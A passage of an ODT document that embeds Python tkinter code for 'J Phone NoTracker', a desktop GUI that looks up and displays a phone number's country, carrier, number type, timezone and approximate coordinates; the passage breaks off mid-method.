      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.accent_color = "#007acc"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.success_color = "#4caf50"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.error_color = "#f44336"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.root.configure(bg=self.bg_color)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Style configuration</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>style = ttk.Style()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>style.theme_use('clam')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>style.configure('TLabel', </text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="23"/>background=self.bg_color, </text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="23"/>foreground=self.fg_color)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>style.configure('TFrame', background=self.bg_color)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>style.configure('TButton', </text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="23"/>background=self.accent_color,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="23"/>foreground=self.fg_color,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="23"/>borderwidth=0,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="23"/>focuscolor='none')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>style.map('TButton',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="17"/>background=[('active', '#005a9e')])</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def setup_ui(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Create all UI components."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Main container with padding</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>main_frame = ttk.Frame(self.root, padding="20")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>main_frame.pack(fill=tk.BOTH, expand=True)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Title</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>title_label = ttk.Label(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>main_frame,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>text="🔍 J Phone NoTracker",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="12"/>font=('Segoe UI', 24, 'bold'),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>foreground=self.accent_color</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>title_label.pack(pady=(0, 20))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>subtitle_label = ttk.Label(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>main_frame,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>text="Phone Number Intelligence &amp; Geolocation",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>font=('Segoe UI', 10),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>foreground='#888888'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>subtitle_label.pack(pady=(0, 30))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Input section</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>input_frame = ttk.Frame(main_frame)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>input_frame.pack(fill=tk.X, pady=(0, 20))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>input_label = ttk.Label(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>input_frame,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>text="Enter Phone Number (International format):",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>font=('Segoe UI', 10)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>input_label.pack(anchor=tk.W, pady=(0, 5))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Input row with button</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>input_row = ttk.Frame(input_frame)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>input_row.pack(fill=tk.X)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.phone_var = tk.StringVar()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.phone_var.set("+255") <text:s/># Default to Tanzania</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.phone_entry = ttk.Entry(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>input_row,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>textvariable=self.phone_var,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>font=('Segoe UI', 12),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>width=30</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.phone_entry.pack(side=tk.LEFT, padx=(0, 10))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.phone_entry.bind('&lt;Return&gt;', lambda e: self.track_number())</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.track_button = ttk.Button(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>input_row,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>text="🔍 TRACK",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>command=self.track_number,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>style='Accent.TButton'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.track_button.pack(side=tk.LEFT)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.clear_button = ttk.Button(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>input_row,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>text="🗑️ CLEAR",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>command=self.clear_input</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.clear_button.pack(side=tk.LEFT, padx=(10, 0))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Results section</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>results_frame = ttk.LabelFrame(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>main_frame,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>text="Tracking Results",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="12"/>padding="15"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>results_frame.pack(fill=tk.BOTH, expand=True)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Create results display with grid layout</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text = tk.Text(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>results_frame,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>height=15,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>wrap=tk.WORD,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>font=('Consolas', 10),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>bg='#2d2d2d',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>fg='#d4d4d4',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>relief=tk.FLAT,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>borderwidth=0</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.pack(fill=tk.BOTH, expand=True)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Configure text tags for colors</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.tag_configure('header', foreground='#4ec9b0', font=('Consolas', 11, 'bold'))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.tag_configure('label', foreground='#9cdcfe')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.tag_configure('value', foreground='#ce9178')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.tag_configure('success', foreground='#6a9955')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.tag_configure('error', foreground='#f44747')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Action buttons</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>actions_frame = ttk.Frame(main_frame)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>actions_frame.pack(fill=tk.X, pady=(15, 0))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.copy_button = ttk.Button(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>actions_frame,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>text="📋 Copy Results",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>command=self.copy_results,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>state=tk.DISABLED</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.copy_button.pack(side=tk.LEFT, padx=(0, 10))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.map_button = ttk.Button(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>actions_frame,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>text="🗺️ Open in Maps",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>command=self.open_in_maps,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>state=tk.DISABLED</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.map_button.pack(side=tk.LEFT, padx=(0, 10))</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.save_button = ttk.Button(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>actions_frame,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>text="💾 Save to History",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>command=self.save_to_history,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>state=tk.DISABLED</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.save_button.pack(side=tk.LEFT)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Status bar</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.status_var = tk.StringVar()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.status_var.set("Ready")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>status_bar = ttk.Label(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.root,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>textvariable=self.status_var,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="12"/>relief=tk.SUNKEN,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>anchor=tk.W</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>status_bar.pack(side=tk.BOTTOM, fill=tk.X)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Welcome message</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.show_welcome()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def show_welcome(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Show welcome message in results area."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>welcome_text = (</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"╔══════════════════════════════════════════════════════════╗\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="57"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="10"/>J Phone NoTracker - Phone Intelligence <text:s text:c="8"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="57"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="2"/>Enter a phone number in international format and <text:s text:c="6"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="2"/>click TRACK to get detailed information including: <text:s text:c="4"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="57"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="2"/>• Country &amp; City Location <text:s text:c="29"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="2"/>• Mobile Carrier / Network Operator <text:s text:c="19"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="2"/>• Timezone &amp; Local Time <text:s text:c="31"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="2"/>• Geographic Coordinates <text:s text:c="30"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="2"/>• Number Type (Mobile/Fixed/VoIP/etc.) <text:s text:c="16"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="57"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="2"/>Example: +255712345678 (Tanzania - tiGO) <text:s text:c="14"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"║ <text:s text:c="57"/>║\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>"╚══════════════════════════════════════════════════════════╝\n"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.delete(1.0, tk.END)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(1.0, welcome_text)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.tag_add('header', '1.0', 'end')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def track_number(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Execute phone number tracking."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>raw_number = self.phone_var.get().strip()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if not raw_number:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>messagebox.showwarning("Input Required", "Please enter a phone number.")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Sanitize input</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>clean_number = sanitize_phone_number(raw_number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.status_var.set(f"Tracking {clean_number}...")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.root.config(cursor="watch")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.root.update()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Perform tracking</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result = self.tracker.track(clean_number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.current_result = result</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Display results</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.display_results(result)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Enable action buttons if valid</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if result.valid:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="16"/>self.copy_button.config(state=tk.NORMAL)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>if result.latitude and result.longitude:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="20"/>self.map_button.config(state=tk.NORMAL)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>self.save_button.config(state=tk.NORMAL)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>self.status_var.set(f"Success: {result.country_name} - {result.carrier_name or 'Unknown carrier'}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>else:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>self.status_var.set("Error: Invalid phone number")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>logger.error(f"Tracking error: {e}", exc_info=True)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>messagebox.showerror("Error", f"Failed to track number: {str(e)}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.status_var.set("Error occurred")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>finally:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.root.config(cursor="")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def display_results(self, result: PhoneNumberInfo):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Display tracking results with formatting.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result: PhoneNumberInfo object</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.delete(1.0, tk.END)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if not result.valid:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "\n❌ INVALID PHONE NUMBER\n\n")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "Please check the format and try again.\n")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "Expected format: +[country code][number]\n")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "Example: +255712345678")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.tag_add('error', '1.0', 'end')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Header</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(tk.END, "\n📱 PHONE NUMBER INFORMATION\n\n", 'header')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Basic information</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(tk.END, "Number: ", 'label')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(tk.END, f"{result.raw_number}\n", 'value')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(tk.END, "Country: ", 'label')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(tk.END, f"{result.country_name}\n", 'value')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if result.location and result.location != result.country_name:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "Region/City: ", 'label')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{result.location}\n", 'value')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(tk.END, "Number Type: ", 'label')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(tk.END, f"{result.number_type}\n", 'value')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Carrier</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(tk.END, "\n📡 NETWORK INFORMATION\n\n", 'header')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if result.carrier_name:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "Carrier: ", 'label')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{result.carrier_name}\n", 'value')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="8"/>else:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "Carrier: ", 'label')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "Not available (may be landline or VoIP)\n", 'value')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Timezone</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.results_text.insert(tk.END, "\n⏰ TIME INFORMATION\n\n", 'header')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if result.timezones:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "Timezone: ", 'label')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{', '.join(result.timezones)}\n", 'value')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if result.local_time:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "Local Time: ", 'label')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, f"{result.local_time}\n", 'value')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Geographic coordinates</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if result.latitude and result.longitude:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "\n🗺️ GEOGRAPHIC LOCATION\n\n", 'header')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.results_text.insert(tk.END, "Latitude: ", 'label')</text:p>
